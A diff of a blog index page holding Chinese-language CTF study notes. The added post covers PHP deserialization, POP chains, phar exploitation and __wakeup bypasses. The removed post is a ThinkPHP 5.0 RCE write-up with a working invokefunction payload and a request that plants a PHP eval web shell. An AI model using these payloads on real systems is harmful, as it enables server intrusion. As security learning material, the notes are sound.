@@ -69,6 +69,65 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-第四周2" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/02/03/%E7%AC%AC%E5%9B%9B%E5%91%A82/" class="article-date">
+  <time class="dt-published" datetime="2025-02-03T11:40:57.000Z" itemprop="datePublished">2025-02-03</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/02/03/%E7%AC%AC%E5%9B%9B%E5%91%A82/">第四周2</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>关于反序列化的姿势：<br>反序列化考点</p>
+<p>字符串逃逸</p>
+<p>POP构造链</p>
+<p>反序列化做题姿势<br>1首先 正常创建类 有方法调用方法 总之要得到想要的内容</p>
+<p>2其次 对创建的类进行序列化 并打印出序列化的内容 需要绕过就更改里面的内容</p>
+<p>3最后 把序列化后的内容 进行提交 有需要编码 就进行编码</p>
+<p>pop链构造做题姿势<br>phar反序列化的三个前提条件&gt; 可以上传phar文件</p>
+<p>有可以利用的魔术方法</p>
+<p>文件操作函数的参数可控</p>
+<p>1、找到可利用的地方，比如，文件包含，命令执行等地方<br>2、从可以利用地方回溯到可控制的地方，找到一个链条。<br>3、更改属性内容，先进行序列化，看看能不能达到目的。<br>4、能够达到目的，才进行反序列化，进行提交 有需要编码 就进行编码</p>
+<p>魔法方法<br>PHP中把以两个下划线__开头的方法称为魔术方法(Magic methods)，这些方法在PHP中充当了举足轻重的作用。 魔术方法包括：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">1. __construct()，类的构造函数</span><br><span class="line"></span><br><span class="line">2. __destruct()，类的析构函数</span><br><span class="line"></span><br><span class="line">3. __call()，在对象中调用一个不可访问方法时调用</span><br><span class="line"></span><br><span class="line">4. __callStatic()，用静态方式中调用一个不可访问方法时调用</span><br><span class="line"></span><br><span class="line">5. __get()，获得一个类的成员变量时调用</span><br><span class="line"></span><br><span class="line">6. __set()，设置一个类的成员变量时调用</span><br><span class="line"></span><br><span class="line">7. __isset()，当对不可访问属性调用isset()或empty()时调用</span><br><span class="line"></span><br><span class="line">8. __unset()，当对不可访问属性调用<span class="built_in">unset</span>()时被调用。</span><br><span class="line"></span><br><span class="line">9. __sleep()，执行serialize()时，先会调用这个函数</span><br><span class="line"></span><br><span class="line">10. __wakeup()，执行unserialize()时，先会调用这个函数</span><br><span class="line"></span><br><span class="line">11. __toString()，类被当成字符串时的回应方法</span><br><span class="line"></span><br><span class="line">12. __invoke()，调用函数的方式调用一个对象时的回应方法</span><br><span class="line"></span><br><span class="line">13. __set_state()，调用var_export()导出类时，此静态方法会被调用。</span><br><span class="line"></span><br><span class="line">14. __clone()，当对象复制完成时调用</span><br><span class="line"></span><br><span class="line">15. __autoload()，尝试加载未定义的类</span><br><span class="line"></span><br><span class="line">16. __debugInfo()，打印所需调试信息</span><br></pre></td></tr></table></figure>
+
+<p>phar反序列化利用<br>可以代替unserialize 进行反序列化操作的函数<br>fileatime	<br>filectime<br>file_exists<br>file_get_contents<br>file_put_contents<br>file<br>filegroup<br>fopen<br>fileinode<br>filemtime<br>fileowner<br>fikeperms<br>is_dir<br>is_executable<br>is_file<br>is_link<br>is_readable<br>is_writable<br>is_writeable<br>parse_ini_file<br>copy<br>unlink<br>stat<br>readfile<br>注意：生成phar文件&#x2F;&#x2F;生成phar文件前需要配置php.ini</p>
+<p>[Phar]<br>; <a target="_blank" rel="noopener" href="http://php.net/phar.readonly">http://php.net/phar.readonly</a><br>phar.readonly &#x3D; On 改成 Off<br>创建对象 exp.phar 是文件名<br>$phar &#x3D; new Phar(‘exp.phar’);<br>$phar-&gt;startBuffering();<br>&#x2F;&#x2F; 设置stub<br>$phar-&gt;setStub(‘<?php __HALT_COMPILER(); ?>‘);<br>$phar-&gt;setMetadata($c1);<br>&#x2F;&#x2F; 要压缩的文件<br>$phar-&gt;addFromString(‘exp.txt’,’test’);<br>$phar-&gt;stopBuffering();<br>特性<br>在 PHP5 &lt; 5.6.25， PHP7 &lt; 7.0.10 的版本存在wakeup的漏洞<br>绕过_wakeup魔法方法</p>
+<p>绕过方法：只需要将对象属性数量设置比原本的要大即可</p>
+<p>利用php&gt;7.1版本对类属性的检测不严格(对属性类型不敏感)</p>
+<p>意味着 序列化的时候可以将portected属性换成public属性</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Private 权限</span><br><span class="line">%00类名%00属性名</span><br><span class="line">Protected 权限</span><br><span class="line">%00*%00属性名</span><br><span class="line">绕过字符过滤</span><br><span class="line">s 换成 S 属性值就可以为十六进制</span><br></pre></td></tr></table></figure>
+
+<p>反序列化原生类的利用<br><a target="_blank" rel="noopener" href="http://www.wangqingzheng.com/anquanke/82/238482.html">http://www.wangqingzheng.com/anquanke/82/238482.html</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/02/03/%E7%AC%AC%E5%9B%9B%E5%91%A82/" data-id="cm6ozgysi0000ssuidrekfvsq" data-title="第四周2" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-第四周1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2025/02/03/%E7%AC%AC%E5%9B%9B%E5%91%A81/" class="article-date">
@@ -598,61 +657,6 @@ echo '~'.urlencode(~'0');
 
 
   
-    <article id="post-第一周1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/01/13/%E7%AC%AC%E4%B8%80%E5%91%A81/" class="article-date">
-  <time class="dt-published" datetime="2025-01-13T02:08:54.000Z" itemprop="datePublished">2025-01-13</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2025/01/13/%E7%AC%AC%E4%B8%80%E5%91%A81/">第一周1</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>题解  ：[SWPUCTF 2022 新生赛]ez_rce<br>   打开这个题目  发现什么也没有        </p>
-<ol>
-<li><p>这个时候可以用dirsearch -u “网址” 来看一下该网址的文件和目录<br>发现robotx.txt文件  我们打开看一下<br>发现提示NSS&#x2F;index.php&#x2F;</p>
-</li>
-<li><p>我们把NSS&#x2F;index.php&#x2F;这个路径输上去<br>发现弹出来Think.php 5.0  由此我们可以联想到Think.php 5.0 漏洞</p>
-</li>
-<li><p>我们在网上找一下 <a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1863419/202112/1863419-20211224202858742-1691585409.png">https://img2020.cnblogs.com/blog/1863419/202112/1863419-20211224202858742-1691585409.png</a><br>该网址是这个漏洞的利用方式</p>
-</li>
-<li><p>s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;ls &#x2F;</p>
-<p>bin boot dev etc flag home lib lib64 media mnt nss opt proc root run sbin srv sys tmp usr var var 好熟悉的界面 似曾相识啊</p>
-<p>发现flag 我们把这个ls &#x2F;换为cat &#x2F;flag<br>发现啥也没有</p>
-</li>
-<li><p>这个时候就感觉可能是套娃了  我选择构造文件来看看<br>payload ：s&#x3D;&#x2F;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;file_put_contents&amp;vars[1][]&#x3D;eval.php&amp;vars[1][]&#x3D;<?php eval($_POST['cmd']);?></p>
-</li>
-<li><p>我们打开中国蚁剑  路径为：<br>NSS&#x2F;eval.php 密码为 cmd<br>发现连接成功<br>发现flag<br>这个题也太坑了  真的是套娃  真的flag在nss&#x2F;ctf&#x2F;flag&#x2F;flag路径下<br>7.总结：<br>  发现页面啥也没有时 可以用dirsearch工具进行 网站目录和文件的扫描 一般可疑文件：robots.txt index.php flag.php<br>  如何出现flag但打开发现没有时 我们可以选择构造文件上传到该网站当前的目录下<br>  最终找到真的flag</p>
-</li>
-</ol>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/01/13/%E7%AC%AC%E4%B8%80%E5%91%A81/" data-id="cm5ulxzzo000b6guih8j005nb" data-title="第一周1" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -689,6 +693,10 @@ echo '~'.urlencode(~'0');
       <ul>
         
           <li>
+            <a href="/2025/02/03/%E7%AC%AC%E5%9B%9B%E5%91%A82/">第四周2</a>
+          </li>
+        
+          <li>
             <a href="/2025/02/03/%E7%AC%AC%E5%9B%9B%E5%91%A81/">第四周1</a>
           </li>
         
@@ -702,10 +710,6 @@ echo '~'.urlencode(~'0');
         
           <li>
             <a href="/2025/01/29/%E7%AC%AC%E4%B8%89%E5%91%A81/">第三周1</a>
-          </li>
-        
-          <li>
-            <a href="/2025/01/21/%E7%AC%AC%E4%BA%8C%E5%91%A83/">第二周3</a>
           </li>
         
       </ul>
